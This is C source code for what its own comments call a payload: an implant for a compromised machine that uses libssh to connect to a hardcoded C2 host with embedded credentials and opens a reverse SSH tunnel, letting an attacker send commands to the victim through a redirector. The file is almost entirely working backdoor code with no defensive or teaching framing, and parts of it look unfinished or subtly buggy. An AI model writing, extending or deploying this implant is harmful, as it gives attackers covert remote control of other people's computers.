#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>

int lastReturnCode = SSH_OK;

enum DataTransferType
{
    FILE_TRANSFER = 0
};

void shutdownSession(ssh_session sesh) {
    ssh_disconnect(sesh);
    ssh_free(sesh);
}

void setupSSHOptions(ssh_session sesh, const char *host, int *port, int *verbosity) {
    ssh_options_set(sesh, SSH_OPTIONS_HOST, host);
    ssh_options_set(sesh, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(sesh, SSH_OPTIONS_PORT, &port);
}

// We implement a reverse tunnel; this allows the C2 server to forward SSH input from the attacker's 
// machine/UI, to the compromised machine:
// payload <======reverse tunnel(via redirector)======C2 server<----SSH commands------attacker laptop/C2 UI
ssh_channel openSSHTunnel(ssh_session sesh, int remotePort, int destPort) {
    ssh_channel tunnelChannel;
    int returnCode;

    returnCode = ssh_channel_listen_forward(sesh, NULL, remotePort, NULL);

    if(returnCode != SSH_OK) {
        returnCode = SSH_ERROR;
        fprintf(stderr, "*** ERROR: Failed to open remote port: %s***\n", ssh_get_error(sesh));
        exit(-1);
    } 
    
    else {
        tunnelChannel = ssh_channel_accept_forward(sesh, 60000, &destPort);
    }

    lastReturnCode = returnCode;

    return tunnelChannel;
}

void closeChannel(ssh_channel channel) {
    ssh_channel_send_eof(channel);
    ssh_channel_free(channel);
}

int main(int argc, char **argv) {
    ssh_session sesh;
    int returnCode;
    int verbosity = SSH_LOG_PROTOCOL;
    int port = 22;

    // Creds; this user will be chroot jailed and have minimal permissions on the SSH server
    const char *username = "ssh_user";
    const char *password = "lD*m58gFT*LR";

    if(argc > 1) {
        port = atoi(argv[1]);
    }

    sesh = ssh_new();

    if(sesh == NULL) {
        fprintf(stderr, "*** ERROR: Failed to create session ***\n");
        exit(-1);
    }

    // TODO: pass in host as argument
    // setupSSHOptions(sesh, "localhost", &port, &verbosity);
    ssh_options_set(sesh, SSH_OPTIONS_HOST, "10.0.2.16");
    ssh_options_set(sesh, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(sesh, SSH_OPTIONS_PORT, &port);

    returnCode = ssh_connect(sesh);

    if(returnCode != SSH_OK) {
        fprintf(stderr, "*** Error connecting to SSH server: %s ***\n", ssh_get_error(sesh));
        exit(-1);
    }

    // We always trust the server, so let's add it to the known hosts
    returnCode = ssh_write_knownhost(sesh);

    printf("Authenticated the server\n");

    returnCode = ssh_userauth_password(sesh, username, password);

    if(returnCode != SSH_AUTH_SUCCESS) {
        fprintf(stderr, "*** ERROR: Failed to authenticate with server ***\n");
        shutdownSession(sesh);

        exit(-1);
    }

    printf("Authenticated with the Server\n");

    ssh_channel tunnelChannel = openSSHTunnel(sesh, 9090, 22);
    
    while(1) {
        char buff[256];
        int numRead = ssh_channel_read(tunnelChannel, buff, sizeof(buff), 0);

        if(numRead <= 0) {
            continue;
        }
    }

    if(tunnelChannel) {
        closeChannel(tunnelChannel);
    }

    shutdownSession(sesh);
}